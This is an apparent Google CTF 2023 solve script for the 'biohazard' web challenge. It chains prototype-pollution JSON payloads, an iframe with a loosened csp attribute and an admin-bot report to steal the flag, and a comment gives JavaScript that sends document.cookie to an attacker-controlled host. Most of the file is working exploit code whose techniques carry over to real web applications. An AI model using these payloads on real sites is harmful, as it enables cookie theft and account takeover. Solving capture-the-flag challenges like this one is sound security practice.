import requests as rqst
import sys

# a victim visiting the bio page will request the bio info with xhr
# whose listener assigns the key to the object prototype,
# hence polluting it.

# python3 l.py '{site 1 to deliver editor.js}'
'''
Content-Type: application/javascript; charset=UTF-8
var i=new Image;
i.src="{site 2 to ctf}?c="+document.cookie;
'''

flag_capturer = sys.argv[1] + '/editor.js'
base_url = 'https://biohazard-web.2023.ctfcompetition.com'
sess = rqst.session()

def new_profile(json_pl):
	r = sess.post(base_url + '/create',
		json = json_pl
	)
	bio_id = r.json()['id']
	return bio_id

# prototype pollution to exfilter the flag
# by injecting editor property into Object,
# hence into any object in the current page.
# note that editor must be kind of array type
# (template literal) as required by trustedResourceUrl
# https://github.com/google/safevalues/blob/main/src/builders/resource_url_builders.ts#L134
json_pl = {
	'name': 'gctf1337',
	'introduction': '',
	'favorites': {'hobbies':'', 'sports': ""},
	'__proto__': {'editor': [f'{flag_capturer}']}
}
bio_id_1 = new_profile(json_pl)
print(f'{bio_id_1 = }')


# embed an iframe with more permissive CSP to allow many a URLs
# but disallow bootstrap.js & editor.js, meanwhile pollute prototype
# to turn on CSP for the IFRAME tag (wildcard will do as well)
# the path name cannot start with /view
json_pl = {
	'name': 'gctf133b',
	'introduction': f'<iframe src="{base_url}/gctf/view/{bio_id_1}"' +
					f'csp="script-src {flag_capturer} ' +
					f'{base_url}/static/closure-library/ ' +
					f'{base_url}/static/sanitizer.js ' +
					f'{base_url}/static/main.js ' +
					"'unsafe-inline' 'unsafe-eval'" +
					'"></iframe>',
	'favorites': {'hobbies':'', 'sports': ''},
	'__proto__': {'IFRAME CSP': 'true'}
}
bio_id_2 = new_profile(json_pl)
print(f'{bio_id_2 = }')

# report the to the admin bot
r = sess.post(base_url + '/report', json =
	{
		'url': f'{base_url}/view/{bio_id_2}'
	}
)
print(r.text)
# get the flag from site 2
# flag=CTF{xss_auditor_is_dead_long_live_csp_attribute}
